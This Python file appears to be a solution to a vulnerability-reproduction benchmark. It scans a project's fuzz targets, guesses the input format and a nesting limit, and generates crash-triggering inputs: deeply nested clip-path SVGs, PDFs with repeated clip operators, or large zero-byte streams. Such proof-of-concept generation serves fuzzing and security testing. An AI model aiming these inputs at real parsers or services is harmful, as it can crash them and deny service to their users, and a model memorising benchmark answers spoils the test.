import os
import re
import tarfile
import zipfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    _TEXT_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".inc", ".inl", ".ipp", ".mm", ".m",
        ".rs", ".go", ".java", ".kt", ".swift",
        ".py", ".js", ".ts",
        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml", ".gn", ".gni", ".bazel", ".bzl",
    }

    def solve(self, src_path: str) -> bytes:
        files = self._load_sources(src_path)
        fuzzer_texts = self._extract_fuzzer_texts(files)
        fmt = self._guess_format(files, fuzzer_texts)
        limit = self._guess_nesting_limit(files, fuzzer_texts)
        depth = max(64, limit + 64)

        if fmt == "pdf":
            return self._gen_pdf(depth)
        elif fmt == "cmd0":
            # Many command-driven fuzzers use FuzzedDataProvider; all-zero input often drives op==0 repeatedly.
            # Provide enough bytes to sustain many iterations even if each iteration consumes multiple bytes.
            # Keep under a few MB.
            nbytes = min(4_000_000, max(256_000, depth * 16))
            return b"\x00" * nbytes
        else:
            return self._gen_svg(depth)

    def _load_sources(self, src_path: str) -> List[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            return self._load_from_dir(src_path)
        if tarfile.is_tarfile(src_path):
            return self._load_from_tar(src_path)
        if zipfile.is_zipfile(src_path):
            return self._load_from_zip(src_path)
        # Fallback: try to read as a single file; may still contain code.
        try:
            with open(src_path, "rb") as f:
                data = f.read()
            return [(os.path.basename(src_path), data)]
        except Exception:
            return []

    def _is_text_candidate(self, name: str, size: int) -> bool:
        base = os.path.basename(name)
        lower = base.lower()
        if base in ("CMakeLists.txt", "BUILD", "WORKSPACE"):
            return True
        _, ext = os.path.splitext(lower)
        if ext in self._TEXT_EXTS:
            return True
        if "fuzz" in lower and ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".txt", ".md"):
            return True
        if ext == "" and ("fuzz" in lower or "cmake" in lower or lower.endswith("makefile")):
            return True
        return False

    def _load_from_dir(self, root: str) -> List[Tuple[str, bytes]]:
        out: List[Tuple[str, bytes]] = []
        max_file_size = 2_000_000
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                rel = os.path.relpath(path, root)
                if not self._is_text_candidate(rel, st.st_size):
                    continue
                try:
                    with open(path, "rb") as f:
                        out.append((rel, f.read()))
                except Exception:
                    continue
        return out

    def _load_from_tar(self, tar_path: str) -> List[Tuple[str, bytes]]:
        out: List[Tuple[str, bytes]] = []
        max_file_size = 2_000_000
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    name = m.name
                    if not self._is_text_candidate(name, m.size):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        out.append((name, f.read()))
                    except Exception:
                        continue
        except Exception:
            pass
        return out

    def _load_from_zip(self, zip_path: str) -> List[Tuple[str, bytes]]:
        out: List[Tuple[str, bytes]] = []
        max_file_size = 2_000_000
        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    if zi.file_size <= 0 or zi.file_size > max_file_size:
                        continue
                    name = zi.filename
                    if not self._is_text_candidate(name, zi.file_size):
                        continue
                    try:
                        with zf.open(zi, "r") as f:
                            out.append((name, f.read()))
                    except Exception:
                        continue
        except Exception:
            pass
        return out

    def _extract_fuzzer_texts(self, files: List[Tuple[str, bytes]]) -> List[str]:
        out: List[str] = []
        for name, data in files:
            if b"LLVMFuzzerTestOneInput" not in data:
                continue
            out.append(self._to_text(data))
        return out

    def _to_text(self, b: bytes) -> str:
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return b.decode("latin1", errors="ignore")
            except Exception:
                return ""

    def _guess_format(self, files: List[Tuple[str, bytes]], fuzzer_texts: List[str]) -> str:
        texts = fuzzer_texts[:] if fuzzer_texts else []

        if not texts:
            # Use a few most relevant-looking files
            scored: List[Tuple[int, str]] = []
            kw = (b"fuzz", b"LLVMFuzzerTestOneInput", b"FuzzedDataProvider", b"svg", b"pdf", b"clip")
            for name, data in files:
                name_l = name.lower().encode("utf-8", errors="ignore")
                score = 0
                for k in kw:
                    if k in data:
                        score += 3
                    if k in name_l:
                        score += 2
                if score > 0:
                    scored.append((score, self._to_text(data)))
            scored.sort(reverse=True, key=lambda x: x[0])
            texts = [t for _, t in scored[:8]]

        combined = "\n".join(texts).lower()

        svg_score = 0
        pdf_score = 0
        cmd_score = 0
        json_score = 0

        def inc(cond: bool, var: str, amt: int) -> None:
            nonlocal svg_score, pdf_score, cmd_score, json_score
            if not cond:
                return
            if var == "svg":
                svg_score += amt
            elif var == "pdf":
                pdf_score += amt
            elif var == "cmd":
                cmd_score += amt
            elif var == "json":
                json_score += amt

        inc("svg" in combined, "svg", 3)
        inc("sksvg" in combined, "svg", 6)
        inc("tinyxml" in combined or "libxml" in combined or "expat" in combined, "svg", 2)
        inc("clip-path" in combined or "clippath" in combined, "svg", 6)
        inc("xml" in combined and "svg" in combined, "svg", 2)

        inc("pdf" in combined, "pdf", 3)
        inc("fpdf_" in combined or "pdfium" in combined, "pdf", 8)
        inc("poppler" in combined or "mupdf" in combined or "fz_open_document" in combined, "pdf", 6)

        inc("fuzzeddataprovider" in combined, "cmd", 8)
        inc("switch" in combined and "case" in combined, "cmd", 2)

        inc("json" in combined, "json", 3)
        inc("lottie" in combined or "skottie" in combined or "rlottie" in combined, "json", 8)
        inc("nlohmann" in combined or "rapidjson" in combined, "json", 4)

        # Prefer explicit file-parsing formats when identified.
        if pdf_score >= max(svg_score, cmd_score, json_score) and pdf_score >= 8:
            return "pdf"
        if svg_score >= max(pdf_score, cmd_score, json_score) and svg_score >= 8:
            return "svg"
        if cmd_score >= max(svg_score, pdf_score, json_score) and cmd_score >= 8:
            return "cmd0"
        if json_score >= max(svg_score, pdf_score, cmd_score) and json_score >= 8:
            # Unknown JSON schema; SVG is more likely to exercise clip stacks in many projects.
            return "svg"
        return "svg"

    def _guess_nesting_limit(self, files: List[Tuple[str, bytes]], fuzzer_texts: List[str]) -> int:
        # Try to find a constant related to nesting depth / clip stack limits.
        relevant_texts: List[str] = []
        key_bytes = [
            b"clip mark", b"clipmark", b"pushclipmark", b"push_clip_mark",
            b"layer/clip", b"layer clip", b"clip stack", b"layer stack",
            b"nesting depth", b"nesting", b"nest", b"depth",
        ]

        for name, data in files:
            dn = data.lower()
            if any(k in dn for k in key_bytes):
                relevant_texts.append(self._to_text(data))

        if fuzzer_texts:
            relevant_texts.extend(fuzzer_texts)

        # Limit scanning size
        if len(relevant_texts) > 30:
            relevant_texts = relevant_texts[:30]

        candidates: List[Tuple[int, int]] = []
        define_re = re.compile(r"(?i)#\s*define\s+\w*(?:NEST|DEPTH|STACK|CLIP)\w*\s+(\d{2,7})")
        assign_re = re.compile(r"(?i)\b(?:k?max(?:imum)?)[\w]*(?:nest(?:ing)?|depth|stack)[\w]*\s*(?:=|:)\s*(\d{2,7})")
        generic_re = re.compile(r"(\d{2,7})")

        def score_line(line: str) -> int:
            l = line.lower()
            s = 0
            if "nest" in l:
                s += 5
            if "depth" in l:
                s += 5
            if "clip" in l:
                s += 4
            if "layer" in l:
                s += 4
            if "stack" in l:
                s += 3
            if "mark" in l:
                s += 2
            if "max" in l or "limit" in l:
                s += 2
            return s

        for t in relevant_texts:
            for line in t.splitlines():
                if not line:
                    continue
                lline = line.lower()
                if ("nest" not in lline and "depth" not in lline and "stack" not in lline) or ("clip" not in lline and "layer" not in lline and "mark" not in lline and "stack" not in lline):
                    continue
                s = score_line(line)
                if s <= 0:
                    continue

                for m in define_re.finditer(line):
                    n = int(m.group(1))
                    if 64 <= n <= 500_000:
                        candidates.append((s + 6, n))
                for m in assign_re.finditer(line):
                    n = int(m.group(1))
                    if 64 <= n <= 500_000:
                        candidates.append((s + 5, n))
                for m in generic_re.finditer(line):
                    n = int(m.group(1))
                    if 64 <= n <= 500_000:
                        candidates.append((s, n))

        if not candidates:
            # Strong prior based on typical implementations and the provided ground-truth size.
            return 32768

        candidates.sort(key=lambda x: (x[0], x[1]), reverse=True)
        best_score = candidates[0][0]
        filtered = [n for s, n in candidates if s >= best_score - 1 and 64 <= n <= 200_000]
        if not filtered:
            filtered = [n for s, n in candidates if s >= best_score - 2 and 64 <= n <= 500_000]
        if not filtered:
            return min(200_000, max(1024, candidates[0][1]))
        # Choose the largest among the best-scoring values to avoid underestimating.
        return min(200_000, max(filtered))

    def _gen_svg(self, depth: int) -> bytes:
        # Intentionally leave tags unclosed to reduce size; most XML parsers will process all start tags until EOF.
        prefix = (
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<defs><clipPath id="a"><rect width="1" height="1"/></clipPath></defs>'
        )
        open_tag = b'<g clip-path="url(#a)">'
        return prefix + (open_tag * depth)

    def _gen_pdf(self, depth: int) -> bytes:
        # Minimal single-page PDF with a content stream containing repeated 'q' + rectangle clip.
        # Attempt to grow graphics/clip nesting.
        op = b"q 0 0 1 1 re W n\n"
        stream = op * depth

        def obj(n: int, body: bytes) -> bytes:
            return f"{n} 0 obj\n".encode() + body + b"\nendobj\n"

        parts: List[bytes] = []
        parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")

        offsets: List[int] = [0]  # xref requires object 0
        cur = len(parts[0])

        o1 = obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        offsets.append(cur); parts.append(o1); cur += len(o1)

        o2 = obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        offsets.append(cur); parts.append(o2); cur += len(o2)

        o3 = obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>")
        offsets.append(cur); parts.append(o3); cur += len(o3)

        o4_body = b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"endstream"
        o4 = obj(4, o4_body)
        offsets.append(cur); parts.append(o4); cur += len(o4)

        xref_start = cur
        xref = [b"xref\n0 5\n"]
        xref.append(b"0000000000 65535 f \n")
        for off in offsets[1:]:
            xref.append(f"{off:010d} 00000 n \n".encode())
        xref_bytes = b"".join(xref)

        trailer = (
            b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"
        )
        return b"".join(parts) + xref_bytes + trailer